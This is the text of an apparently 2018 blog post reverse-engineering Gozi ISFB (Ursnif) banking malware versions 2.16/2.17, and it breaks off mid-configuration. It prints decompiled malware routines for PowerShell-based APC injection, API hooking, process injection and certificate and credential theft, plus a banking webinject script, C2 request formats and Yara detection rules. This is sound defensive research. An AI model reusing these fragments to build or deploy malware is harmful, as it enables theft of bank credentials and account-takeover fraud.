{
    "id": "b65948d7-4312-4ee4-85e3-67c55c87b87c",
    "created_at": "2023-01-12T15:06:15.364163Z",
    "updated_at": "2025-03-27T02:05:45.628855Z",
    "deleted_at": null,
    "sha1_hash": "a9a26424e8cccd99bf7543d60581f5dd1140c711",
    "title": "2018-08-25 - Let's Learn- In-Depth Reversing of Recent Gozi ISFB Banking Malware Version 2.16-2.17 (portion of ISFB v3) & -loader.dll-client.dll-",
    "authors": "",
    "file_creation_date": "2022-05-28T04:40:02Z",
    "file_modification_date": "2022-05-28T04:40:02Z",
    "file_size": 1040137,
    "plain_text": "# Let's Learn: In-Depth Reversing of Recent Gozi ISFB Banking Malware Version 2.16/2.17 (portion of ISFB v3) & \"loader.dll/client.dll\"\n\n**[vkremez.com/2018/08/lets-learn-in-depth-reversing-of-recent.html](https://www.vkremez.com/2018/08/lets-learn-in-depth-reversing-of-recent.html)**\n\n## Goal: Reverse engineer and analyze one of the latest Gozi \"ISFB\" ( also called \"Ursnif'\" amongst various researchers) banking malware variants focusing on the one of the latest \"client.dll\" 32-bit (x86) one.\n\n #ursnif @ hxxp://mghl.de/logs/ssl.cabhttps://t.co/RnuXaCrgAz — Racco42 (@Racco42) August 20, 2018\n\n Malware:\n Original Packed Loader (MD5: e2476ed98a57bbb14f45fd1e04d4c43c)\n Downloaded Tor 32-bit DLL Module (MD5: cc312c797e73d06f397516f9b9d7a438)\n Leaked \"client.dll\" (February 3, 2015) (MD5: 4fe85d04cc4b8602c27973ab3f08b997)\n Unpacked Injected \"client.dll\" (April 14, 2018)(MD5: c23a41c83e82f45b6742ad07218232f9) Other observed \"client.dll\":\n *Unpacked Injected \"client.dll\" (July 31, 2018)(MD5: 22b748df15e580b10c984f691f7c0fa9)\n *Unpacked \"loader.dll\" (August 20, 2018)(MD5: 3ec8607de7b0b194f19962d3e987031c)\n *Unpacked Injected \"client.dll\" (August 20, 2018) (MD5: 51d010dbca2aa9031b4d12312b56637b)\n Outline:\n```\nI. Malware Campaign Spreading \"ISFB\" Banker \nII. Background on ISFB Banker\nIII. ISFB Loader v3 (August 20, 2018): QueueUserAPC & PowerShell\nIV. Differences Between Leaked ISFB and ISFB 2.16/2.17 Variants\nV. Tor Onion Library\nVI. Stealer Methods\nVII. Hooking Method\nVIII. Process Injection\nIX. Inject Processor\nX. Yara Signature: \nA. ISFB v2.17 \"loader.dll\" (32-bit) version\nB. ISFB v2.16/2.17 \"client.dll\" (32-bit) version \nXI. Addendum\nA. Extracted ISFB Configuration\nB. Hooked APIs\nC. Original Commands from Leaked ISFB v2.13\nD. ISFB \"RM3\" Function and Debug Statements\n\n I. Malware Campaign Spreading \"ISFB\" Banker\n While reviewing one of the latest malware campaign spreading the notable ISFB banker, I\n\n```\n\n-----\n\n## decided to dive deeper into this banker malware sample. It is notable that this specific malware campaign was targeting customers of Italian financial institutions. However, this same bot contains webinjects configuration for both US and Canadian financial institutions. II. Background on ISFB Banker ISFB Banker malware is one of the oldest and one of the most advanced information-stealing malware tracing some of the code to 2006. The Gozi is traced back to the notable \"76Service,\" \"CRM,\" and \"Project Blitzkrieg\" criminal business clubs targeting customers of financial institutions. I highly recommend reading Maciej Kotowiez's paper titled \"ISFB: Still Live and Kicking\" before learning more about ISFB banker. The ISFB version \"2.13.24.1\" (February 3, 2015) source code was leaked originally on the criminal underground in 2015. This same was also uploaded by researchers to GitHub. In the past, the source code of the malware kit was offered for sale for $30,000 USD. However, shortly after, its main actor group offered the code for the following prices:\n```\nMinimalistic ISFB: $12,000 USD\nKeylogger support: $3,0000 USD\nSOCKS support: $3,000 USD\nStealer support: $5,000 USD\nAnti-Rapport: $4,000 USD\nVNC support: $8,000 USD\nBackconnect support: $3,000 USD\n\n The original client dropper/loader module was called originally \"CRM\" as part of the Gozi ISFB project. It is notable that the Gozi project originally included the \"IAP\" web panel project and the \"ICS\" configurator. It is worth to highlight that there are multiple groups that use the ISFB toolkit including the ones that developed their own \"Dreambot\" web panel. Fortinet did interesting coverage of the differences between \"Dreambot\" and the leaked ISFB (including its \"joined files\" (or “FJ”) struct). III. ISFB Loader (August 20, 2018): QueueUserAPC & PowerShell ISFB banker also contains a simple injected \"loader.dll\" after the cryptor routine that is used to launch the execution of the malware. The unpacked ISFB loader is small in size of just 44 kb with three imported DLLs.\n\n Notably, this loader was observed for observed heavily leveraging PowerShell scripting for registry persistence functionality via the hardcoded cmd command invoking PowerShell:\npowershell invoke-expression([System.Text.Encoding]::ASCII.GetString((getitemproperty\\\n 'HKCU:\\%S').%s))\n\n```\n\n-----\n\n## For example, the loader creates a PowerShell script in hex in the registry that can be decoded that leverages QueueUserAPC bytecode injection to process the next stage as follows:\n```\n$qbhuthvrmyf = \"[DllImport(\"kernel32\")]\npublic static extern IntPtr GetCurrentProcess();\n[DllImport(\"kernel32\")]\npublic static extern \nIntPtr VirtualAllocEx(IntPtr wwj,IntPtr lxffofo,uint aoconcm,uint iuk,uint \\\n hwsivuroj);\"\n$xuisvutgkgo=Add-Type -memberDefinition $qbhuthvrmyf -Name 'qyaaexcigm' \\\n-namespace Win32Functions -passthru;\n$ujppmfuuik=\"[DllImport(\"kernel32\")]\npublic static extern IntPtr GetCurrentThreadId();\n[DllImport(\"kernel32\")]\n  public static extern IntPtr OpenThread(uint xwocdx,uint adflgvt,IntPtr xbxe);\n  [DllImport(\"kernel32\")]\n  public static extern uint QueueUserAPC(IntPtr ijaq, IntPtr twsxxmyebm,\\\n IntPtr xfnggdcn);\n  [DllImport(\"kernel32\")]\npublic static extern void SleepEx(uint ocqxap,uint cpvoeuen);\";\n$eeihwxjq=Add-Type -memberDefinition $ujppmfuuik -Name 'btdpmiijeg' -namespace \\\n Win32Functions -passthru;\n\n The \"loader\" module communicates over HTTP to a separated ISFB server, which hosts the \"client\" modules (32-bit and 64-bit ones) and the above PowerShell script called \"run.\" Additionally, on July 30, 2018, one ISFB v3 group released the \"client.dll\" with debugging on. This version 3.0 with build ID \"613\" revealed that that the loader was called \"RM3\".\n\n```\n\n-----\n\n```\n[%s:%u] RM3 loader version %u.%u build %u on Windows %u.%u.%u %s\n\n## The main internal \"loader.dll\" control functions with the respective description are as follows:\n\n RM3 \"loader.dll' Function Function Description\n\n LdrStartLoaderProcess starts \"loader.dll\" process\n\n Ldr2LoadIni checks \"LOADER.INI\" signature check\n\n Ldr2LoadFile retrieves modules over HTTP and checks for signature\n\n LdrIsElevated checks the host integrity level and if it has elevated privileges\n\n Ldr2GetLoaderModule retrieves and loads the startup module\n\n Ldr2SaveModulesToRegistry saves modules to the registry and creates registry hives\n\n Ldr2SaveAllModules saves 32-bit and 64-bit \"client.dll\" modules to the registry\n\n Ldr2MakeRunRecord creates an autorun value and makes sure the memory is allocated.\n\n Ldr2RegEnumCallback enumerates and writes autorun value and sets\n\n Ldr2MakeEncodedImage creates an encoded image using the public key with Serpent and checks for \"BlExecuteDllImage\" export\n\n ReplaceSubStr parses and replaces strings\n\n Ldr2SetupModules tries to elevate privileges and loads modules, walks the registry, and and restarts modules as necessary\n\n Ldr2LoadModules tries to load modules\n\n```\n\n-----\n\n## Ldr2DisableIeDialogs disables Internet Explorer dialog since it leverages it for downloading modules\n\n Ldr2LoaderMain starts the main loader function\n\n All of the modules are encoded with Serpent encryption and can be decoded using its public key. Subsequently, the malware would subsequently install the client.dll via injecting it into explorer.exe and storing a copy of it in the registry. The malware developers, however, deliberately erased a portion of the PE header and removed named references to imported DLL \"kernel32.dll\" and \"ntdll.dll\" making malware analysis just a little bit more complicated. IV. Differences Between Leaked ISFB and Latest ISFB Variant I decided to take a look at the leaked code and review their compiled client DLL code. It is notable that the leaked ISFB had the version \"2.13.24.1\" (February 3, 2015), while one of the latest ISFB variants had a version of \"2.16\" (April 14, 2018) with the build id \"994.\" The observed botnet ID for the latest sample was \"1000.\" It is worth noting that since ISFB also has version \"2.17\" (August 20, 2018), which improved some code structure from the previous version and added @KILL@=* inject control. The unpacked 2.16 client.dll contains 645 functions with 183 KB size, while the leaked client.dll contains 512 functions with 136 KB size. The bot also stores \"Client32\" and \"Client64\" in FJ struct. The newer sample leverages \".bss\" section and unpacks the code via the following pseudo- coded C++ function:\n\n\n-----\n\n```\n/////////////////////////////////////////////////////////////// \n///////// ISFB variant \".bss\" DecodeFunction //////////////////\n///////////////////////////////////////////////////////////////\nint __stdcall bss_decodeFunction(int a1)\n v15 = 0;\n String1 = 0;\n v12 = 0;\n v13 = 0;\n v14 = 0;\n lstrcpynA(&String1, \".bss\", 8);\n v1 = decoder(a1, (int)&String1);\n v2 = v1;\n if ( v1 )\n {\n  v3 = *(_DWORD *)(v1 + 12);\n  if ( v3 && *(_DWORD *)(v1 + 16) )\n  {\n   v4 = *(_DWORD *)(v1 + 16);\n   v5 = *(_DWORD *)\"018\";\n   v6 = (*(_DWORD *)\"14 2018\" ^ *(_DWORD *)\"Apr 14 2018\" ^ (v4 + v3)) + 14;\n   v7 = (char *)VirtualAlloc(0, v4, 0x3000u, 4u);\n   v8 = v7;\n   if ( v7 )\n   {\n    ror4_dec(v7, (char *)(a1 + *(_DWORD *)(v2 + 12)), *(_DWORD *)(v2 + 16), v6,\n1);\n // \"version=%u&soft=%u&user=%08x%08x%08x%08x&server=%u&id=%u&type=%u&name=%s\"\n    v9 = *(_DWORD *)(v2 + 12);\n    dword_1002B0D4 = *(_DWORD *)(&v8[(_DWORD)aVersionUSoftUU] + -a1 - v9)\n            + *(_DWORD *)(&v8[-a1 - v9 + 4] + (_DWORD)aVersionUSoftUU)\n            - *(_DWORD *)(&v8[-a1 - v9 + 12] + (_DWORD)aVersionUSoftUU);\n    if ( dword_1002B0D4 == 0x736C6E70 )\n     memcpy((void *)(a1 + v9), v8, *(_DWORD *)(v2 + 16));\n    else\n     v15 = 12;\n    VirtualFree(v8, 0, 0x8000u);\n   }\n\n## It is important to investigate binary-level and function-level differences between the leaked earlier version of ISFB and the recent unpacked one before taking a deeper dive into the newer version.\n\n```\n\n-----\n\n## The latest v2.16 version contains the exact same static import table as the original leaked v2.13 one with the additional 4 ntdll.dll (e.g., new and changed APIs are NtQuerySystemInformation, RtlUpcaseUnicodeString, RtlImageNtHeader, _snprintf, etc.) and 7 kernel32.dll imports. In order to identify and highlight differences, I decided to utilize an open-source plugin tool \"Diaphora\" for IDA leveraging its decompiler mode. The binary diff analysis between the latest client.dll versus the leaked one version shows the following results:\n```\nFull matches: 259 functions\nPartial matches: 72 functions\nUnreliable matches: 126 functions\nUnmatched functions in the latest client.dll: 21 functions\nUnmatched functions in the leaked client.dll: 188 functions\n\n```\n\n-----\n\n## Some of the differences in the latest client DLL include additions in the URI template such as follows with \"/images/\" URI path, for example:\n```\n&ip=%s\n&os=%s\n&tor=1\n%time=%lu\n%action=%u\n\n```\n\n-----\n\n## By and large, in general, the ISFB bot<->server communication channels relies on four major types of communication:\n```\nHardcoded domains\nDomain Generation Algorithm (DGA)\nTor Onion Communication\nPeer-to-Peer Protocol (P2P)\n\n The URI requests are linked to the same path \"soft=%u&version=%u&user=%08x%08x%08x%08x&server=%u&id=%u&crc=%x\":\n\".gif\" - obtain a new task, which is linked to \"LastTask\" registry check\n\".jpeg\" - obtain a new config, which saves the new config. \nIt is linked to \"Main\" registry check, which saves the config.\n\".bmp\"\n\".avi\"\n\n The newer version has a different user-agent string as \"Mozilla/5.0 (Windows NT %u.%u%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.71 Safari/537.36\" versus the leaked one with \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT %u.%u%s).\" By and large, the ISFB variant bot heavily relies on the registry for storage and queries of tasks including the following registry query checks for the values of interest:\n\n```\n\n-----\n\n```\n#define szDataRegDataValue_src   _T( Main )\n#define szDataRegBlockValue_src  _T(\"Block\")\n#define szDataRegTemplate_src   _T(\"Temp\")\n#define szDataRegClientId_src   _T(\"Client\")\n#define szDataRegIniValue_src   _T(\"Ini\")\n#define szDataRegKeysValue_src   _T(\"Keys\")\n#define szDataRegKillValue_src   _T(\"Kill\")\n#define szDataRegExeValue_src   _T(\"Install\")\n#define szDataRegTaskValue_src   _T(\"LastTask\")\n//#define szDataRegConfigValue_src _T(\"LastConfig\")\n#define szDataRegTorValue_src   _T(\"TorClient\")\n//#define szDataRegExecValue_src  _T(\"Exec\")\n//#define szDataRegOperaHook_src  _T(\"OpHook\")\n//#define szDataRegCrhromeHook_src _T(\"CrHook\")\n\n## The bot also checks the config settings for \"LastTask\", for example in the registry via the following \"GetLastTask\" proc near prototype in ASM:\n\n```\n\n-----\n\n```\n;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;\n;;;;;;;;;;;;; ISFB Gozi GetLastTask ;;;;;;;;;;;;;\n;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;\n push ebp\n mov ebp, esp\n sub esp, 24h\n push ebx\n push esi\n push edi\n lea eax, [ebp+cbData]\n push eax           ; lpcbData\n lea eax, [ebp+lpMem]\n push eax ; int\n xor ebx, ebx\n push offset aLasttask     ; \"LastTask\"\n mov [ebp+var_14], ebx\n call RegQueryValueExFunction\n cmp eax, ebx\n jnz short loc_100036CC\n cmp [ebp+cbData], 8\n mov eax, [ebp+lpMem]\n jnz short loc_100036BC\n mov ecx, [eax]\n mov dword ptr [ebp+Data], ecx\n mov ecx, [eax+4]\n mov [ebp+var_1C], ecx\n jmp short loc_10003BA9\n\n## Additionally, the latest ISFB variant deploys system checks in addition to the usual software enumeration via HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\ for \"net view\" command (view of mapped devices, shares) as well as \"nslookup myip.opendns.com resolver1.opendns.com\" (view of external IP address), which are new to the malware variant. IV. Tor Onion Library This specific ISFB variant version 2.16 was configured to use the Tor DLL library that was downloaded for either 32-bit or 64-bit architecture for bot<->server communications The downloaded Tor DLL contains the program database as follows: C:\\Users\\mr_wi\\OneDrive\\Projects\\tordll\\Release\\tordll.pdb Additionally, the Tor DLL library contained the following four DLL exports:\n\n Name Address Ordinal\n\n TorCloseRequest 100022D0 1\n\n TorCompleteRequest 10002210 2\n\n TorOpenRequest 10001DF0 3\n\n TorSendRequest 10002100 4\n\n DllEntryPoint 10184402 [main entry]\n\n```\n\n-----\n\n## The malware retrieves Tor modules (either 32-bit or 64-bit ones) via the dynamic configuration with the \"file://\" path.\n```\n;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;\n;;;;;;;;;;;;; ISFB Gozi Tor \"file://\" & Communicator Check ;;;;;;;\n;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;\n push ebp     ; \n mov ebp, esp\n push ecx\n push ecx ; lpSrch\n push ebx ; lpFirst\n push esi\n mov esi, StrStrIA\n push edi\n mov edi, eax\n push offset Srch       ; \"file://\"\n push edi ; lpFirst\n call esi ; StrStrIA\n xor ebx, ebx\n cmp eax, edi\n jz short loc_10003B98\n push offset a_onion      ; \".onion/\"\n push edi ; lpFirst\n call esi ; StrStrIA\n test eax, eax\n lea eax, [ebp+var_4]\n push eax\n lea eax, [ebp+lpMem]\n push eax\n jz short loc_10003B90\n push 1\n push ebx\n push ebx\n push ebx\n push ebx\n push dword_1002B160\n push edi\n call sub_1000E0EE\n jmp short loc_10003BA9\nThe following pseudo-coded instruction is responsible for storing the \"TorClient\" in\nregistry:\n\n```\n\n-----\n\n```\n/////////////////////////////////////////////////////////////////////// \n/////// ISFB \"TorClient\" RegistrySetup excerpt //////////////////////// \n/////////////////////////////////////////////////////////////////////// \n if ( cbData > 0x40000 )\n  {\n   v8 = GetTempFileNameA_getcurrentthread(0);\n   if ( v8 )\n   {\n    v2 = registryWriteFile(v8, 0, 0, (int)ImageBase, v7);\n    if ( !v2 )\n    {\n     v9 = lstrlenA(v8) + 1;\n     rol4(v8, v9, dword_1002B098);\n     v2 = RegSetValueEx_func(aTorclient, (BYTE *)v8, v9, 3u);//\"TorClient\"\n    }\n    HeapFree(hHeap, 0, (LPVOID)v8);\n   }\n   else\n   {\n    v2 = 8;\n   }\n  }\n  else\n  {\n   rol4(ImageBase, cbData, dword_1002B098);\n   v2 = RegSetValueEx_func(aTorclient, (BYTE *)ImageBase, v7, 3u);//TorClient\"\n  }\n }\n if ( ImageBase )\n  HeapFree(hHeap, 0, ImageBase);\n return v2;\n}\n\n## V. Stealer Methods Finally, ISFB leverages multiple functionalities to retrieve certificates, extract cookie information, steal email accounts stored locally. A. \"GET_SYSINFO\" The malware opens a registry key \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\" and enumerates keys via RegEnumKeyExW API to obtain a list of installed software. B. \"GET_CERTS\"\n\n```\n\n-----\n\n## The malware hooks CryptGetUserKey API and exports user-specific certificates to \".pfx\" file from the Windows certificate store and sends them to the server. The function also contained a unique string \"ISFB.\"\n```\n/////////////////////////////////////////////////////////////////////// \n/////// ISFB \"GetCertificates\" to .pfx /////////////////////////////// \n/////////////////////////////////////////////////////////////////////// \nCertExportToPfx(\"My\", CertFullName);\nCertExportToPfx(\"AddressBook\", CertFullName);\nCertExportToPfx(\"AuthRoot\", CertFullName);\nCertExportToPfx(\"CertificateAuthority\", CertFullName);\nCertExportToPfx(\"Disallowed\", CertFullName);\nCertExportToPfx(\"Root\", CertFullName);\nCertExportToPfx(\"TrustedPeople\", CertFullName);\nCertExportToPfx(\"TrustedPublisher\", CertFullName);\n\n C. \"GET_COOKIES\" ISFB tries to obtain cookies from the following browsers, for example:\nInternet Explorer (local search as \"*.txt\" in APPDATA\\Low)\nMozilla Firefox (local search as Mozilla\\Firefox for \"cookies.sqlite\")\n\n The ISFB variant also searches for \"*.sol\" files associated with Flash Player cookies. C. \"GET_MAIL\" ISFB harvests and sends to the server Windows Live Mail and Outlook email credentials via\n\n```\n\n-----\n\n## local and registry searches of both software and browser store logins focusing on HTTP, IMA, POP3, and SMTP emails and passwords and stores them in this following format:\n```\ntype=%S, name=%S, address=%S, server=%S, port=%u, ssl=%S, user=%S, password=%S\n\n Additionally, it issues a command \"cmd.exe\" /C pause mail\" to presumably unlock the retrieval of email credentials from applications. VI. Hooking Method While \"relaxing\" SPDY browser security (e.g., via \"user_pref(\"network.http.spdy.enabled\", false)\" in Mozilla Firefox's \"prefs.js\" file), ISFB uses their own user-mode hooking method of various API calls. For example, the malware hooks various Mozilla Firefox browser APIs and leverages ntdll's API such as LdrRegisterDllNotification to set and remove DLL load and unload notification call-back, for example.\n\n The malware also hooks LoadLibraryA, for example, to intercept calls while targeting Chrome and Opera. Additionally, it hooks API as well to bypass SPDY. Other malware hooks include RegGetValueW RegQueryValueExW for querying registry, CreateProcess* (4 APIs) hooks for process injection as well as CryptGetUserKey hook for certificate export. As usual, the malware overwrites the function prologue with the relative JMP opcode (0xe9) to its detour function.\n\n```\n\n-----\n\n```\n//////////////////////////////////////////////////////\n// ISFB Banker 'EnableHook' with \"0xe9\" offset jmp ///\n////////////////////////////////////////////////////// \nv4 = (void *)lstrlenDecoder(a2, *(LPCSTR *)(a1 + 4), 0, (int)&v12);\n lpAddress = v4;\n if ( v4 )\n {\n  flNewProtect = 0;\n  if ( VirtualProtect(v4, 4u, 0x40u, &flNewProtect) )\n  {                      \n   v5 = flOldProtect;\n   *(_DWORD *)(flOldProtect + 0x18) = a1;\n   *(_DWORD *)(v5 + 8) = a2 + *(_DWORD *)v4;\n   *(_DWORD *)(v5 + 12) = v4;\n   *(_DWORD *)(v5 + 16) = *(_DWORD *)v4;\n   v14 = HookVirtual_recurs(a2, v5, a1, a3);\n   if ( v14 == 1 )\n   {\n    if ( dword_1002B070 )\n    {\n     v6 = func8DecoderHeapFree(a2, *(_DWORD *)(v5 + 8));\n     if ( v6 )\n     {                   // Set up the function for\n\"PAGE_EXECUTE_READWRITE\" w/ VirtualProtect\n      if ( VirtualProtect((LPVOID)v6, 5u, 0x40u, &flOldProtect) )\n      {\n       *(_DWORD *)(v6 + 1) = *(_DWORD *)(v5 + 20) - v6 - 5;\n       *(_BYTE *)v6 = 0xE9u;       // \"0xe9\" opcode for a jump with 32bit relative \n       *(_DWORD *)(v5 + 0x14) = v6;\n       *(_DWORD *)(a1 + 0xC) = v6;\n       if ( flOldProtect != 0x40 )\n        flOldProtect = 0x20;\n       VirtualProtect((LPVOID)v6, 5u, flOldProtect, &flOldProtect);\n      }\n     }\n    }\n    *(_DWORD *)lpAddress = *(_DWORD *)(v5 + 20) - a2;\n    VirtualProtect(lpAddress, 4u, flNewProtect, &flNewProtect);\n    *(_DWORD *)(v5 + 28) |= 0x102u;\n    if ( *(_WORD *)(v5 + 28) & 0x200 )\n     VirtualProtectMain(v7, (const CHAR *)v12, v5);\n    EnterCriticalSection(&stru_1002B220);\n    v8 = dword_1002B218;\n    *(_DWORD *)v5 = dword_1002B218;\n    *(_DWORD *)(v5 + 4) = &dword_1002B218;\n    v8[1] = v5;\n    dword_1002B218 = (LPVOID)v5;\n    LeaveCriticalSection(&stru_1002B220);\n    *(_DWORD *)(a1 + 16) = a2 + *(_DWORD *)(v5 + 16);\n    v14 = 0;\n    v9 = ZwQueryInformationProcess2(a2);\nVII. Process Injection\n\n```\n\n-----\n\n## One of the notable malware components is its process injection routine that deals with \"client\" DLL injection. The process injection works around CreateProcess* hooks set up by the malware. For example, the malware sets up their CreateProcessW with the function prototype having the suspended flag (0x4) and the subsequent process injection call. The idea is to suspend processes before they start, inject the malware DLL into them, and resume them.\n\n ISFB also uses a pretty clever trick to make sure processes of interest are not hooked too early, i.e., before their main thread execution. The malware simply hacks a way to patch via ReadProcessMemory/WriteProcessMemory process original entry point (OEP) and wait until it loads and then restores unmapping the executable in the process memory and resuming/running it in memory. This method is also referenced in the leaked ISFB.\n\n\n-----\n\n```\n//////////////////////////////////////////////////////\n// ISFB Banker CreateProcess \"OEP\" Patch Until Main ///\n////////////////////////////////////////////////////// \nsigned int __userpurge ProcessInjectDll(int a1, int a2, char a3, void *a4)\n{\n lpProcessInformation_thread = a1;\n v15 = 0;\n memset(&v16, 0, 0x2C8u);\n hProcess = *(HANDLE *)lpProcessInformation_thread;\n v6 = *(void **)lpProcessInformation_thread;\n origin_patch = 0xCCCCFEEB;\n intArchitect = 0;\n if ( open_proc_x86_x64(v6, 0) )        // Check if process x64/x86\n {\n  intArchitect = 0x10;\n }\n else if ( orig_patch & 1 )\n {\n  oep = GetProcessEntry(a2);\n  goto LABEL_19;\n }\n v15 = 0x10007;\n oep_1 = a4;\n if ( !a4 )\n  oep_1 = (LPVOID)ZwQuery_RtlNtStatusToDosError_0(*(HANDLE\n*)lpProcessInformation_thread);\n if ( ReadProcessMemory(hProcess, oep_1, &original_1, 4, &NumberOfBytesRead)\n  && NumberOfBytesRead == 4\n  && PatchMemory(hProcess, oep_1, (int)&origin_patch) )// sizeof(0xCCCCFEEB) ->\npatch \n {\n  v10 = 3000;\n  do\n  {\n   ResumeThread(*(HANDLE *)(lpProcessInformation_thread + 4));\n   if ( WaitForSingleObject(hHandle, 0x64u) != 0x102 )\n    v10 = 0x64;\n   SuspendThread(*(HANDLE *)(lpProcessInformation_thread + 4));\n   v10 -= 0x64;\n   RtlNtStatusToDosErrorMain(*(_DWORD *)(lpProcessInformation_thread + 4),\n(int)&v15);\n  }                      // Unmap injected image in memory of\nthe process NtUnmapViewofSection /WriteProcessMemory\n  while ( v10 > 0 && v17 != oep_1 );\n  if ( v17 == oep_1 )\n   oep = injectImageUnmap(a2, (HANDLE *)lpProcessInformation_thread, intArchitect,\n0);\n  else\n   oep = 0x261;\n  PatchMemory(hProcess, oep_1, (int)&original_1);// restore -> original OEP bytes\nLABEL_19:\n  if ( oep != 0xFFFFFFFF )\n   goto LABEL_21;\n }\n\n```\n\n-----\n\n```\n oep GetLastError();\nLABEL_21:\n if ( !(a3 & 4) )\n  ResumeThread(*(HANDLE *)(lpProcessInformation_thread + 4));\n return oep;\n}\nVIII. Inject Processor\n\n## The ISFB variant leverages the following key logic elements for credential-stealing functionality and uses them for webinject and replica control:\n@ID@ -> bot id (victim host identity)  \n@GROUP@ -> group id (group id of the bot) \n@RANDSTR@ -> random string\n@URL=*@ -> targeted financial institutions\n@CONFIG=*@ -> configuration\n@VIDEO=*@ -> video to record once the victim visit the page of interest\n@SOCKS=*@ -> connect SOCKS server\n@KILL=*@ -> kill command (only with 2.17 version)\n@VNC=*@ -> connect VNC\n\n As mentioned earlier, this specific campaign targeted customers of Italian, Canadian, and US financial institutions. The webinject injects in their config are stored in the registry and are presented in the following own format, for example.\n/////////////////////////////////////////////////////////\n////////////////// ISFB WebInject Config Example ////////\n/////////////////////////////////////////////////////////\n\"<TARGETED_FINANCIAL_INSTITUTION_URL>*\", \n\"<!DOCTYPE***<body***>\", \n\"<!DOCTYPE***<body***style='display: none;'><script type='text/javascript'\\\nid='script_id' src='/@ID@/script.js?\\\nx=@ID@&y=@GROUP@&d=@ID@&bname=<TARGETED_FINANCIAL_INSTITUTION_URL>&v=@VIDEO@=7,180'>\n</script>\" \n}\n\n One of the more interesting features of the malware is on-demand video-recording victim visits to specific websites usually for 3 minutes with VIDEO parameters { @VIDEO@=7,180 }. Indeed, ISFB utilizes imported Avifil32.dll and various AVI* functions to record data to a\n\n```\n\n-----\n\n## stream saving it locally and exfiltrating it later to the server in order to review it for the possible account takeover fraud. Moreover, ISFB also uses known webinject scripts developed by another actor. The scripts are called \"_brows.cap\" with the script name <script name=\"fAkEelem'>. The example of the observed inject is as follows:\n```\n/////////////////////////////////////////////////////////\n////////////////// Inject Excerpt ///////////////////////\n/////////////////////////////////////////////////////////\nvar wdebug = 0;\nvar replacer_run_count = 0;\nvar bot_nick = \"@ID@\";\nvar account_id;\nString.prototype.fAkElink=\"<WEBFAKE_INJECT_SERVER_URL>\";\nString.prototype.fAkEstyle=document.createElement(\"style\");\nString.prototype.fAkEcss='body{visibility:hidden;}';\n''.fAkEstyle.setAttribute(\"type\", \"text/css\");\nif(''.fAkEstyle.styleSheet){// IE\n ''.fAkEstyle.styleSheet.cssText = ''.fAkEcss;\n} else {// w3c\nString.prototype.fAkEcssText = document.createTextNode(''.fAkEcss);\n ''.fAkEstyle.appendChild(''.fAkEcssText);\n}\nif(document.domain.search(/<TARGETED_BANK_URL/g)>-1){\ndocument.getElementsByTagName(\"head\")[0].appendChild(''.fAkEstyle);\nString.prototype.fAkEstart=function(){\nif((document.readyState&&document.readyState==\"complete\")||\\\n(document.body&&document.body.readyState==\"complete\")){\nif(document.body&&document.body.nodeName.toUpperCase()!=\"FRAMESET\"){\nif(!document.getElementById(\"js_com_1_qweqwe\")){\\\nString.prototype.fAkETitle=\ndocument.getElementsByTagName('title').length>0?\ndocument.getElementsByTagName('title')[0].innerHTML:\"doc. have frame\";\n''.fAkEMakeElem(\"c=1&at=2&n=@ID@&b=TARGETED_BANK_URL/\"+\"&d=\"+encodeURIComponent(docume\n+\"&doc_url=\"+encodeURIComponent(document.location.href)+\"&doc_title=\"+encodeURICompone\n Date()),\nfunction(){document.body.style.visibility =\n\"visible\";},\"script\",\"js_com_1_qweqwe\",false);\n};\n}else{\ndocument.body.style.visibility = \"visible\";\n}\n}else{setTimeout(function(){''.fAkEstart()},1000);}\n};''.fAkEstart();\n}\n\n IX. Yara Signature A. ISFB v2.17 \"loader.dll\" (32-bit) version\n\n```\n\n-----\n\n```\nrule crime_win32_isfb_v217_loader_dll {\n  meta:\n   description = \"Detects ISFB loader.dll version 2.17 Aug 20, 2018\"\n   author = \"@VK_Intel\"\n   date = \"2018-08-28\"\n   hash1 = \"d3254467f310f5de9387119d9ec572f045286df70747ca97d99a993eca3efa23\"\n  strings:\n   $x1 = \"/C powershell invokeexpression([System.Text.Encoding]::ASCII.GetString((get-itemproperty\n'HKCU:\\\\%S').%s))\" fullword wide\n   $s0 = \".bss\" fullword wide\n   $s1 = \"GetBinaryValue\" fullword wide\n   $s2 = \"loader.dll\" fullword ascii\n   $s3 = \"/C \\\"copy \\\"%s\\\" \\\"%s\\\" /y && rundll32 \\\"%s\\\",%S\\\"\" fullword wide\n   $s4 = \"/C ping localhost -n %u && del \\\"%s\\\"\" fullword wide\n  condition:\n   ( uint16(0) == 0x5a4d and\n     filesize < 100KB and\n     pe.imphash() == \"d7f06c756511270cacf97147c81ebb0b\" and\n     ( 1 of ($x*) or 4 of them )\n   ) or ( 5 of them )\n}\n\n## B. ISFB v2.16/2.17 \"client.dll\" (32-bit) version\nrule crime_win32_isfb_v216_217__client_dll {\n  meta:\n   description = \"Detecs Unpacked Gozi ISFB v. 2.16 variant client32.dll\"\n   author = \"@VK_Intel\"\n   date = \"2018-08-25\"\n   hash1 = \"5df8714c8ab4675681d45f5cc1408ce734010ccf179fb6386304e6194568b60a\"\n  strings:\n   $x1 = \".bss\" fullword ascii\n   $s1 = \"PluginRegisterCallbacks\" fullword ascii\n   $s2 = \"Client\" fullword ascii\n   $s3 = \"TorClient\" fullword ascii\n   $s4 = \"client.dll\" fullword ascii\n   $s5 = \".jpeg\" fullword ascii\n   $s6 = \".bmp\" fullword ascii\n   $s7 = \"nslookup myip.oOutlinpendns.com resolver1.opendns.com\" fullword ascii\n  condition:\n   ( uint16(0) == 0x5a4d and\n     filesize < 500KB and\n     ( 1 of ($x*) and 4 of them )\n   ) or ( all of them )\n}\n\n X. Addendum A. Extracted ISFB Configuration*\n\n```\n\n-----\n\n```\nConfig Fail Timeout   [u 1200 ]\nSend Timeout      [u'240']\nKnocker Timeout     [u'300']\nDGA Season       [u'10']\nBotnet ID        